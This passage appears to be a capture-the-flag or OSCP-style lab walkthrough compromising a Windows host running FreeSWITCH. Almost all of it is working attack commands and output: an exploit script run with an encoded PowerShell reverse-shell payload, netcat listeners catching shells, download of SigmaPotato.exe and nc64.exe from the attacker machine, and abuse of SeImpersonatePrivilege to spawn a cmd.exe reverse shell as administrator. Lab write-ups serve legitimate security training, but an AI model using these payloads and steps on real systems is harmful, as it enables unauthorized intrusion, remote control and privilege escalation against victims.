$ python 47799.txt 192.168.56.151 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADUANgAiACwAOQAwADEAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
Authenticated
```
```
$ nc -lvnp 9011              
listening on [any] 9011 ...

id
connect to [192.168.49.56] from (UNKNOWN) [192.168.56.151] 62537
PS C:\Program Files\FreeSWITCH> whoami
oscp\chris
PS C:\Program Files\FreeSWITCH> 
PS C:\Users\chris\Desktop> type local.txt
```
### Privilege Escalation
```
PS C:\Users\chris\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
##### SeImpersonatePrivilege -->SigmaPotato.exe、nc64.exe
https://github.com/tylerdotrar/SigmaPotato/releases/tag/v1.2.6
```
PS C:\Users\chris\Desktop> iwr http://192.168.49.56:8011/SigmaPotato.exe -OutFile C:\Users\chris\Desktop\SigmaPotato.exe

PS C:\Users\chris\Desktop> iwr http://192.168.49.56:8011/nc64.exe -OutFile C:\Users\chris\Desktop\nc64.exe

PS C:\Users\chris\Desktop> .\SigmaPotato.exe "nc64.exe 192.168.49.56 9119 -e cmd.exe"
```
```
$ nc -lvnp 9119              
listening on [any] 9119 ...
connect to [192.168.49.56] from (UNKNOWN) [192.168.56.151] 62626
Microsoft Windows [Version 10.0.19043.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Users\Administrator\Desktop>type proof.txt
```
